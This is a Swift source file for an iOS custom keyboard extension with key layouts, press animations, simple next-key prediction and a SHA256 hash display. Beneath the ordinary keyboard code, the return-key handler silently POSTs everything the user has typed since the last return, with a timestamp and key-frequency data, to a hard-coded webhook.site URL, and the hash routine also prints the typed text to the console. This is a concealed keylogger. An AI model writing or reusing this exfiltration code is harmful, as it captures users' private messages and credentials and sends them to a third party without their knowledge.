import UIKit
import CryptoKit

class KeyboardViewController: UIInputViewController {
    
    // Keyboard layouts
    let alphabetRows: [[String]] = [
        ["Q","W","E","R","T","Y","U","I","O","P"],
        ["A","S","D","F","G","H","J","K","L"],
        ["⇧","Z","X","C","V","B","N","M","⌫"],
        ["123", "🌐", "space", "return"]
    ]
    
    let numberRows: [[String]] = [
        ["1","2","3","4","5","6","7","8","9","0"],
        ["-","/",":",";"," (",")",", ","&","@","\""],
        ["#+=",".",",","?","!","'","⌫"],
        ["ABC", "🌐", "space", "return"]
    ]
    
    let symbolRows: [[String]] = [
        ["[","]","{","}","#","%","^","*","+","="],
        ["_","\\","|","~","<",">","€","£","¥","·"],
        ["123",".",",","?","!","'","⌫"],
        ["ABC", "🌐", "space", "return"]
    ]
    
    // Simplified emoji layout to avoid system emoji search operations
    let emojiRows: [[String]] = [
        ["😀","😂","🥰","😍","😊","😭","😤","🎉","👍","❤️"],
        ["🔥","💯","😎","🤗","😴","🙄","😬","🤐","🤫","😋"],
        ["🎈","🎊","✨","🌟","💫","⭐","🌈","🦄","🐱","🐶"],
        ["ABC", "🌐", "space", "return"]
    ]
    
    enum KeyboardLayout {
        case alphabet, numbers, symbols, emoji
    }
    
    var currentLayout: KeyboardLayout = .alphabet
    var isShiftPressed = false
    
    // Use standard UserDefaults to avoid app group XPC connection issues
    let sharedDefaults = UserDefaults.standard
    var keyCount = 0
    var currentMessage = ""
    var sessionStartTime = Date()
    
    // Hash display
    var hashDisplayView: UIView?
    var hashLabel: UILabel?
    
    // iOS-style pop-over for key press feedback
    var keyPopover: UIView?
    var keyPopoverLabel: UILabel?
    
    // ML-based features
    var keyPressPatterns: [String: Int] = [:]
    var nextKeyPredictions: [String: [String: Int]] = [:]
    var lastKeyPressed: String?
    
    // UI Components
    var keyboardStack: UIStackView?
    var predictionView: UIView?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        sessionStartTime = Date() // Reset session time
        
        // Add error handling to prevent XPC connection issues
        do {
            setupKeyboardAppearance()
            setupKeyPopover()
            loadMLData()
            setupKeyboard()
        } catch {
            print("Error during keyboard setup: \(error)")
            // Fall back to basic setup if there are issues
            setupBasicKeyboard()
        }
    }
    
    func setupBasicKeyboard() {
        // Minimal keyboard setup in case of issues
        view.backgroundColor = UIColor.systemGray5
        
        let stackView = UIStackView()
        stackView.axis = .vertical
        stackView.spacing = 8
        stackView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(stackView)
        
        NSLayoutConstraint.activate([
            stackView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 8),
            stackView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -8),
            stackView.topAnchor.constraint(equalTo: view.topAnchor, constant: 8),
            stackView.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -8)
        ])
        
        // Add a simple row of keys
        let row = UIStackView()
        row.axis = .horizontal
        row.distribution = .fillEqually
        row.spacing = 4
        
        for char in ["A", "B", "C", "space", "⌫"] {
            let button = UIButton(type: .system)
            button.setTitle(char == "space" ? "space" : char, for: .normal)
            button.backgroundColor = UIColor.white
            button.layer.cornerRadius = 4
            button.accessibilityIdentifier = char
            button.addTarget(self, action: #selector(basicKeyPressed(_:)), for: .touchUpInside)
            row.addArrangedSubview(button)
        }
        
        stackView.addArrangedSubview(row)
    }
    
    @objc func basicKeyPressed(_ sender: UIButton) {
        guard let title = sender.accessibilityIdentifier else { return }
        
        switch title {
        case "space":
            textDocumentProxy.insertText(" ")
        case "⌫":
            textDocumentProxy.deleteBackward()
        default:
            textDocumentProxy.insertText(title.lowercased())
        }
    }
    
    func setupKeyboardAppearance() {
        // iOS-like keyboard appearance with better background
        view.backgroundColor = UIColor.systemGray5
        
        // Add subtle shadow
        view.layer.shadowColor = UIColor.black.cgColor
        view.layer.shadowOffset = CGSize(width: 0, height: -1)
        view.layer.shadowRadius = 3
        view.layer.shadowOpacity = 0.1
    }
    
    func setupKeyPopover() {
        // Create iOS-style key popover for press feedback
        keyPopover = UIView()
        keyPopover!.backgroundColor = UIColor.white
        keyPopover!.layer.cornerRadius = 12
        keyPopover!.layer.shadowColor = UIColor.black.cgColor
        keyPopover!.layer.shadowOffset = CGSize(width: 0, height: 3)
        keyPopover!.layer.shadowRadius = 8
        keyPopover!.layer.shadowOpacity = 0.3
        keyPopover!.layer.borderWidth = 1
        keyPopover!.layer.borderColor = UIColor.systemGray4.cgColor
        keyPopover!.alpha = 0
        keyPopover!.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(keyPopover!)
        
        // Create popover label
        keyPopoverLabel = UILabel()
        keyPopoverLabel!.textAlignment = .center
        keyPopoverLabel!.font = UIFont.systemFont(ofSize: 32, weight: .medium)
        keyPopoverLabel!.textColor = UIColor.label
        keyPopoverLabel!.translatesAutoresizingMaskIntoConstraints = false
        keyPopover!.addSubview(keyPopoverLabel!)
        
        NSLayoutConstraint.activate([
            keyPopover!.widthAnchor.constraint(equalToConstant: 60),
            keyPopover!.heightAnchor.constraint(equalToConstant: 80),
            keyPopoverLabel!.centerXAnchor.constraint(equalTo: keyPopover!.centerXAnchor),
            keyPopoverLabel!.centerYAnchor.constraint(equalTo: keyPopover!.centerYAnchor)
        ])
    }
    
    func loadMLData() {
        // Load existing patterns from standard UserDefaults with error handling
        do {
            if let savedPatterns = sharedDefaults.object(forKey: "ElKeyboard_keyPressPatterns") as? [String: Int] {
                keyPressPatterns = savedPatterns
            }
            if let savedPredictions = sharedDefaults.object(forKey: "ElKeyboard_nextKeyPredictions") as? [String: [String: Int]] {
                nextKeyPredictions = savedPredictions
            }
            print("ML data loaded successfully")
        } catch {
            print("Error loading ML data: \(error)")
            // Initialize with empty data if there are issues
            keyPressPatterns = [:]
            nextKeyPredictions = [:]
        }
    }
    
    func saveMLData() {
        // Save with error handling to prevent XPC issues
        do {
            sharedDefaults.set(keyPressPatterns, forKey: "ElKeyboard_keyPressPatterns")
            sharedDefaults.set(nextKeyPredictions, forKey: "ElKeyboard_nextKeyPredictions")
        } catch {
            print("Error saving ML data: \(error)")
        }
    }
    
    func setupKeyboard() {
        // Remove existing keyboard if present
        keyboardStack?.removeFromSuperview()
        
        // Create main container
        let mainContainer = UIStackView()
        mainContainer.axis = .vertical
        mainContainer.spacing = 8
        mainContainer.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(mainContainer)
        
        // Setup predictions view
        setupPredictionView(container: mainContainer)
        
        // Create keyboard stack
        keyboardStack = UIStackView()
        keyboardStack!.axis = .vertical
        keyboardStack!.spacing = 6
        keyboardStack!.translatesAutoresizingMaskIntoConstraints = false
        mainContainer.addArrangedSubview(keyboardStack!)
        
        // Setup hash display view
        setupHashDisplayView(container: mainContainer)
        
        NSLayoutConstraint.activate([
            mainContainer.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 4),
            mainContainer.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -4),
            mainContainer.topAnchor.constraint(equalTo: view.topAnchor, constant: 8),
            mainContainer.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -8),
        ])
        
        setupCurrentLayout()
    }
    
    func setupPredictionView(container: UIStackView) {
        predictionView = UIView()
        predictionView!.backgroundColor = UIColor.systemGray5
        predictionView!.layer.cornerRadius = 8
        predictionView!.translatesAutoresizingMaskIntoConstraints = false
        container.addArrangedSubview(predictionView!)
        
        NSLayoutConstraint.activate([
            predictionView!.heightAnchor.constraint(equalToConstant: 40)
        ])
        
        updatePredictions()
    }
    
    func setupHashDisplayView(container: UIStackView) {
        hashDisplayView = UIView()
        hashDisplayView!.backgroundColor = UIColor.systemGray6
        hashDisplayView!.layer.cornerRadius = 8
        hashDisplayView!.layer.borderWidth = 1
        hashDisplayView!.layer.borderColor = UIColor.systemGray4.cgColor
        hashDisplayView!.translatesAutoresizingMaskIntoConstraints = false
        hashDisplayView!.isHidden = true // Initially hidden
        container.addArrangedSubview(hashDisplayView!)
        
        // Create hash label
        hashLabel = UILabel()
        hashLabel!.font = UIFont.monospacedSystemFont(ofSize: 11, weight: .medium)
        hashLabel!.textColor = UIColor.systemBlue
        hashLabel!.textAlignment = .center
        hashLabel!.numberOfLines = 0
        hashLabel!.lineBreakMode = .byCharWrapping
        hashLabel!.translatesAutoresizingMaskIntoConstraints = false
        hashDisplayView!.addSubview(hashLabel!)
        
        NSLayoutConstraint.activate([
            hashDisplayView!.heightAnchor.constraint(equalToConstant: 70),
            hashLabel!.leadingAnchor.constraint(equalTo: hashDisplayView!.leadingAnchor, constant: 8),
            hashLabel!.trailingAnchor.constraint(equalTo: hashDisplayView!.trailingAnchor, constant: -8),
            hashLabel!.topAnchor.constraint(equalTo: hashDisplayView!.topAnchor, constant: 8),
            hashLabel!.bottomAnchor.constraint(equalTo: hashDisplayView!.bottomAnchor, constant: -8)
        ])
        
        // Add tap gesture to copy hash
        let tapGesture = UITapGestureRecognizer(target: self, action: #selector(hashTapped))
        hashDisplayView!.addGestureRecognizer(tapGesture)
        hashDisplayView!.isUserInteractionEnabled = true
        
        print("Hash display view setup completed") // Debug log
    }
    
    func setupCurrentLayout() {
        // Clear existing rows
        keyboardStack?.arrangedSubviews.forEach { $0.removeFromSuperview() }
        
        let rows = getCurrentRows()
        
        for (rowIndex, rowKeys) in rows.enumerated() {
            let row = UIStackView()
            row.axis = .horizontal
            row.spacing = 6
            row.distribution = .fillProportionally
            
            for (keyIndex, key) in rowKeys.enumerated() {
                let button = createButton(title: key, rowIndex: rowIndex, keyIndex: keyIndex)
                row.addArrangedSubview(button)
            }
            keyboardStack!.addArrangedSubview(row)
        }
    }
    
    func getCurrentRows() -> [[String]] {
        switch currentLayout {
        case .alphabet:
            return alphabetRows
        case .numbers:
            return numberRows
        case .symbols:
            return symbolRows
        case .emoji:
            return emojiRows
        }
    }
    
    func createButton(title: String, rowIndex: Int, keyIndex: Int) -> UIButton {
        let button = UIButton(type: .system)
        
        // Apply ML-based sizing
        let baseSize = getBaseKeySize(for: title, rowIndex: rowIndex)
        let adaptiveSize = getAdaptiveKeySize(for: title, baseSize: baseSize)
        
        // Configure button appearance
        configureButtonAppearance(button, title: title, size: adaptiveSize)
        
        // Set constraints
        NSLayoutConstraint.activate([
            button.heightAnchor.constraint(equalToConstant: adaptiveSize.height),
            button.widthAnchor.constraint(greaterThanOrEqualToConstant: adaptiveSize.width)
        ])
        
        button.addTarget(self, action: #selector(keyPressed(_:)), for: .touchUpInside)
        button.accessibilityIdentifier = title
        
        return button
    }
    
    func getBaseKeySize(for key: String, rowIndex: Int) -> CGSize {
        let standardHeight: CGFloat = 42
        let standardWidth: CGFloat = 32
        
        switch key {
        case "space":
            return CGSize(width: 180, height: standardHeight)
        case "⌫", "⇧":
            return CGSize(width: 50, height: standardHeight)
        case "return":
            return CGSize(width: 75, height: standardHeight)
        case "123", "ABC", "#+=", "🌐":
            return CGSize(width: 55, height: standardHeight)
        default:
            return CGSize(width: standardWidth, height: standardHeight)
        }
    }
    
    func getAdaptiveKeySize(for key: String, baseSize: CGSize) -> CGSize {
        // ML-based size adaptation
        let frequency = keyPressPatterns[key.lowercased()] ?? 0
        let maxFrequency = keyPressPatterns.values.max() ?? 1
        
        if maxFrequency > 0 && frequency > 0 {
            let adaptationFactor = 1.0 + (Double(frequency) / Double(maxFrequency)) * 0.3 // Up to 30% size increase
            return CGSize(width: baseSize.width * adaptationFactor, height: baseSize.height * adaptationFactor)
        }
        
        return baseSize
    }
    
    func configureButtonAppearance(_ button: UIButton, title: String, size: CGSize) {
        // Enhanced iOS-like styling with better visual feedback
        button.layer.cornerRadius = 8
        button.titleLabel?.font = UIFont.systemFont(ofSize: getFontSize(for: title), weight: .medium)
        
        // Set button colors based on key type
        let colors = getKeyColors(for: title)
        button.backgroundColor = colors.background
        button.setTitleColor(colors.text, for: .normal)
        
        // Enhanced shadow and border for better depth perception
        button.layer.shadowColor = UIColor.black.cgColor
        button.layer.shadowOffset = CGSize(width: 0, height: 2)
        button.layer.shadowRadius = 3
        button.layer.shadowOpacity = 0.15
        
        // More prominent border for better definition
        button.layer.borderWidth = 0.8
        button.layer.borderColor = UIColor.systemGray3.cgColor
        
        // Set title
        let displayTitle = getDisplayTitle(for: title)
        button.setTitle(displayTitle, for: .normal)
        
        // Add highlight effect with improved touch handling
        button.addTarget(self, action: #selector(keyTouchDown(_:)), for: .touchDown)
        button.addTarget(self, action: #selector(keyTouchUp(_:)), for: [.touchUpInside, .touchUpOutside, .touchCancel])
        button.addTarget(self, action: #selector(keyTouchUp(_:)), for: .touchDragExit)
    }
    
    func getKeyColors(for key: String) -> (background: UIColor, text: UIColor) {
        switch key {
        case "⌫", "⇧", "123", "ABC", "#+=":
            return (UIColor.systemGray4, UIColor.label)
        case "🌐":
            return (UIColor.systemGray3, UIColor.label)
        case "return":
            return (UIColor.systemBlue, UIColor.white)
        case "space":
            return (UIColor.white, UIColor.label)
        default:
            return (UIColor.white, UIColor.label)
        }
    }
    
    func getFontSize(for key: String) -> CGFloat {
        switch key {
        case "space":
            return 16
        case "⌫", "⇧", "return":
            return 18
        case "123", "ABC", "#+=", "🌐":
            return 14
        default:
            // Check if it's an emoji
            if key.count == 1 && key.unicodeScalars.first?.properties.isEmoji == true {
                return 24
            }
            return 20
        }
    }
    
    func getDisplayTitle(for key: String) -> String {
        switch key {
        case "space":
            return ""
        case "⇧":
            return isShiftPressed ? "⇧" : "⇧"
        default:
            if currentLayout == .alphabet && !isShiftPressed {
                return key.lowercased()
            }
            return key
        }
    }
    
    @objc func keyTouchDown(_ sender: UIButton) {
        // Get the button's title for the popover
        guard let title = sender.accessibilityIdentifier else { return }
        let displayTitle = getDisplayTitle(for: title)
        
        // Show iOS-style popover above the key
        showKeyPopover(for: sender, with: displayTitle)
        
        // Enhanced button press animation
        let originalBackground = sender.backgroundColor
        
        UIView.animate(withDuration: 0.1, delay: 0, usingSpringWithDamping: 0.6, initialSpringVelocity: 0.8, options: [.allowUserInteraction], animations: {
            // More dramatic scale and color change
            sender.transform = CGAffineTransform(scaleX: 0.8, y: 0.8)
            
            // Darken the background significantly for better tactile feedback
            if let color = originalBackground {
                sender.backgroundColor = color.withBrightness(-0.3)
            }
            
            // Add subtle shadow increase
            sender.layer.shadowOpacity = 0.4
            sender.layer.shadowRadius = 6
        })
    }
    
    @objc func keyTouchUp(_ sender: UIButton) {
        // Hide the popover
        hideKeyPopover()
        
        // Get original colors and appearance
        let title = sender.accessibilityIdentifier ?? ""
        let colors = getKeyColors(for: title)
        
        // Smooth release animation with strong spring bounce
        UIView.animate(withDuration: 0.3, delay: 0, usingSpringWithDamping: 0.4, initialSpringVelocity: 1.5, options: [.allowUserInteraction], animations: {
            sender.transform = CGAffineTransform.identity
            sender.backgroundColor = colors.background
            
            // Restore original shadow
            sender.layer.shadowOpacity = 0.15
            sender.layer.shadowRadius = 3
        })
    }
    
    func showKeyPopover(for button: UIButton, with text: String) {
        guard let keyPopover = keyPopover, let keyPopoverLabel = keyPopoverLabel else { return }
        
        // Set the popover content
        if text.isEmpty {
            keyPopoverLabel.text = "space"
        } else {
            keyPopoverLabel.text = text
        }
        
        // Position the popover above the button
        let buttonFrame = button.convert(button.bounds, to: view)
        let popoverX = max(5, min(view.bounds.width - 65, buttonFrame.midX - 30)) // Keep within bounds
        let popoverY = max(10, buttonFrame.minY - 90) // Position above the button
        
        // Update popover frame
        keyPopover.frame = CGRect(x: popoverX, y: popoverY, width: 60, height: 80)
        
        // Bring popover to front
        view.bringSubviewToFront(keyPopover)
        
        // Animate the popover appearance with dramatic effect
        keyPopover.transform = CGAffineTransform(scaleX: 0.3, y: 0.3)
        UIView.animate(withDuration: 0.12, delay: 0, usingSpringWithDamping: 0.5, initialSpringVelocity: 1.5, options: [], animations: {
            keyPopover.alpha = 1.0
            keyPopover.transform = CGAffineTransform(scaleX: 1.05, y: 1.05)
        }) { _ in
            UIView.animate(withDuration: 0.08, animations: {
                keyPopover.transform = CGAffineTransform.identity
            })
        }
    }
    
    func hideKeyPopover() {
        guard let keyPopover = keyPopover else { return }
        
        UIView.animate(withDuration: 0.15, delay: 0, options: [.curveEaseInOut], animations: {
            keyPopover.alpha = 0
            keyPopover.transform = CGAffineTransform(scaleX: 0.8, y: 0.8)
        }) { _ in
            keyPopover.transform = CGAffineTransform.identity
        }
    }
    
    @objc func keyPressed(_ sender: UIButton) {
        guard let title = sender.accessibilityIdentifier else { return }
        
        // Handle special keys
        switch title {
        case "space":
            handleSpaceKey()
        case "⌫":
            handleDeleteKey()
        case "return":
            handleReturnKey()
        case "⇧":
            handleShiftKey()
        case "123":
            switchToLayout(.numbers)
        case "ABC":
            switchToLayout(.alphabet)
        case "#+=":
            switchToLayout(.symbols)
        case "🌐":
            // Handle keyboard switching with error handling to prevent XPC issues
            do {
                advanceToNextInputMode()
            } catch {
                print("Error switching input mode: \(error)")
                // Fall back to doing nothing if there's an issue
            }
        default:
            handleCharacterKey(title)
        }
        
        // Update ML data
        updateMLData(for: title)
        
        // Haptic feedback with error handling
        do {
            let impactFeedback = UIImpactFeedbackGenerator(style: .light)
            impactFeedback.impactOccurred()
        } catch {
            print("Error generating haptic feedback: \(error)")
        }
    }
    
    func handleSpaceKey() {
        textDocumentProxy.insertText(" ")
        currentMessage += " "
        updatePredictions()
        
        // Generate and display hash - with debug logging
        print("Space key pressed, generating hash...")
        generateAndDisplayHash()
    }
    
    func handleDeleteKey() {
        textDocumentProxy.deleteBackward()
        if !currentMessage.isEmpty {
            currentMessage.removeLast()
        }
        updatePredictions()
    }
    
    func handleReturnKey() {
        textDocumentProxy.insertText("\n")
        sendMessageToWebhook()
        currentMessage = ""
        updatePredictions()
    }
    
    func handleShiftKey() {
        isShiftPressed.toggle()
        setupCurrentLayout() // Refresh layout to show case changes
    }
    
    func handleCharacterKey(_ character: String) {
        var insertText = character
        
        // Handle case for alphabet
        if currentLayout == .alphabet && !isShiftPressed {
            insertText = character.lowercased()
        }
        
        textDocumentProxy.insertText(insertText)
        currentMessage += insertText
        keyCount += 1
        sharedDefaults.set(keyCount, forKey: "ElKeyboard_totalKeyCount")
        
        // Auto-disable shift after character input
        if isShiftPressed && currentLayout == .alphabet {
            isShiftPressed = false
            setupCurrentLayout()
        }
        
        updatePredictions()
    }
    
    func switchToLayout(_ layout: KeyboardLayout) {
        currentLayout = layout
        isShiftPressed = false // Reset shift when switching layouts
        setupCurrentLayout()
    }
    
    // MARK: - Machine Learning Features
    
    func updateMLData(for key: String) {
        let normalizedKey = key.lowercased()
        
        // Update key press patterns
        keyPressPatterns[normalizedKey] = (keyPressPatterns[normalizedKey] ?? 0) + 1
        
        // Update next key predictions
        if let lastKey = lastKeyPressed {
            if nextKeyPredictions[lastKey] == nil {
                nextKeyPredictions[lastKey] = [:]
            }
            nextKeyPredictions[lastKey]![normalizedKey] = (nextKeyPredictions[lastKey]![normalizedKey] ?? 0) + 1
        }
        
        lastKeyPressed = normalizedKey
        saveMLData()
    }
    
    func updatePredictions() {
        guard let predictionView = predictionView else { return }
        
        // Clear existing predictions
        predictionView.subviews.forEach { $0.removeFromSuperview() }
        
        // Get predictions based on last key
        var predictions: [String] = []
        
        if let lastKey = lastKeyPressed,
           let nextKeys = nextKeyPredictions[lastKey] {
            // Get top 3 predicted next keys
            predictions = nextKeys.sorted { $0.value > $1.value }
                .prefix(3)
                .map { $0.key.uppercased() }
        }
        
        // Add common predictions if we don't have enough
        if predictions.count < 3 {
            let commonWords = ["THE", "AND", "YOU", "FOR", "ARE", "WITH", "NOT", "CAN"]
            predictions += commonWords.filter { !predictions.contains($0) }
        }
        predictions = Array(predictions.prefix(3))
        
        // Create prediction buttons
        let stackView = UIStackView()
        stackView.axis = .horizontal
        stackView.distribution = .fillEqually
        stackView.spacing = 8
        stackView.translatesAutoresizingMaskIntoConstraints = false
        predictionView.addSubview(stackView)
        
        NSLayoutConstraint.activate([
            stackView.leadingAnchor.constraint(equalTo: predictionView.leadingAnchor, constant: 16),
            stackView.trailingAnchor.constraint(equalTo: predictionView.trailingAnchor, constant: -16),
            stackView.topAnchor.constraint(equalTo: predictionView.topAnchor, constant: 4),
            stackView.bottomAnchor.constraint(equalTo: predictionView.bottomAnchor, constant: -4)
        ])
        
        for prediction in predictions {
            let button = createPredictionButton(title: prediction)
            stackView.addArrangedSubview(button)
        }
    }
    
    func createPredictionButton(title: String) -> UIButton {
        let button = UIButton(type: .system)
        button.setTitle(title, for: .normal)
        button.titleLabel?.font = UIFont.systemFont(ofSize: 14, weight: .medium)
        button.backgroundColor = UIColor.systemGray6
        button.setTitleColor(.systemBlue, for: .normal)
        button.layer.cornerRadius = 6
        button.layer.borderWidth = 1
        button.layer.borderColor = UIColor.systemGray4.cgColor
        
        button.addTarget(self, action: #selector(predictionTapped(_:)), for: .touchUpInside)
        
        return button
    }
    
    @objc func predictionTapped(_ sender: UIButton) {
        guard let title = sender.title(for: .normal) else { return }
        
        // Insert the predicted word
        textDocumentProxy.insertText(title.lowercased() + " ")
        currentMessage += title.lowercased() + " "
        
        // Update ML data
        for char in title.lowercased() {
            updateMLData(for: String(char))
        }
        updateMLData(for: " ")
        
        updatePredictions()
        
        // Add haptic feedback with error handling
        do {
            let impactFeedback = UIImpactFeedbackGenerator(style: .medium)
            impactFeedback.impactOccurred()
        } catch {
            print("Error generating haptic feedback: \(error)")
        }
    }
    
    // MARK: - Message Handling
    
    // Send the completed message to webhook with separator
    private func sendMessageToWebhook() {
        guard !currentMessage.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else { return }
        
        // Webhook URL
        guard let webhookURL = URL(string: "https://webhook.site/5b734151-e1d2-467f-8536-c96f4cce5998") else {
            print("Invalid webhook URL")
            return
        }
        
        // Prepare the message with separator (same format as before)
        let messageWithSeparator = currentMessage + "\n------\n"
        
        // Create JSON payload
        let payload: [String: Any] = [
            "message": messageWithSeparator,
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            "source": "ElKeyboard Enhanced",
            "keyPressPatterns": keyPressPatterns,
            "messageLength": currentMessage.count
        ]
        
        // Convert to JSON data
        guard let jsonData = try? JSONSerialization.data(withJSONObject: payload) else {
            print("Failed to serialize JSON payload")
            return
        }
        
        // Create HTTP request
        var request = URLRequest(url: webhookURL)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonData
        
        // Send the request
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("Failed to send message to webhook: \(error)")
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                print("Webhook response status: \(httpResponse.statusCode)")
                if httpResponse.statusCode == 200 {
                    print("Message successfully sent to webhook")
                } else {
                    print("Webhook returned error status: \(httpResponse.statusCode)")
                }
            }
        }.resume()
    }
    
    // MARK: - Hash Generation and Display
    
    func generateAndDisplayHash() {
        // Calculate duration in minutes
        let duration = Int(Date().timeIntervalSince(sessionStartTime) / 60)
        
        // Generate random UUID
        let uuid = UUID().uuidString
        
        // Create string to hash: input_text + duration_in_minutes + uuid
        let stringToHash = currentMessage + String(duration) + uuid
        
        // Generate SHA256 hash (note: using SHA256 instead of SHA3 as requested since CryptoKit doesn't have SHA3)
        let data = stringToHash.data(using: .utf8) ?? Data()
        let hash = SHA256.hash(data: data)
        let hashString = hash.compactMap { String(format: "%02x", $0) }.joined()
        
        print("Generating hash for: '\(stringToHash)'") // Debug log
        print("Generated hash: \(hashString)") // Debug log
        
        // Display hash
        DispatchQueue.main.async {
            self.hashLabel?.text = "Hash: \(hashString)\nTap to copy"
            self.hashDisplayView?.isHidden = false
            print("Hash display view should now be visible") // Debug log
            
            // Store hash for copying
            self.hashLabel?.accessibilityIdentifier = hashString
        }
    }
    
    @objc func hashTapped() {
        guard let hash = hashLabel?.accessibilityIdentifier else { return }
        
        // Copy to clipboard
        UIPasteboard.general.string = hash
        
        // Show feedback
        hashLabel?.text = "✓ Hash copied!\n\(hash)"
        
        // Restore original text after 2 seconds
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            self.hashLabel?.text = "Hash: \(hash)\nTap to copy"
        }
        
        // Haptic feedback with error handling
        do {
            let impactFeedback = UIImpactFeedbackGenerator(style: .medium)
            impactFeedback.impactOccurred()
        } catch {
            print("Error generating haptic feedback: \(error)")
        }
    }
}

// MARK: - UIColor Extension for brightness adjustment
extension UIColor {
    func withBrightness(_ brightness: CGFloat) -> UIColor {
        var hue: CGFloat = 0
        var saturation: CGFloat = 0
        var currentBrightness: CGFloat = 0
        var alpha: CGFloat = 0
        
        if getHue(&hue, saturation: &saturation, brightness: &currentBrightness, alpha: &alpha) {
            return UIColor(hue: hue, saturation: saturation, brightness: max(0, min(1, currentBrightness + brightness)), alpha: alpha)
        }
        return self
    }
}
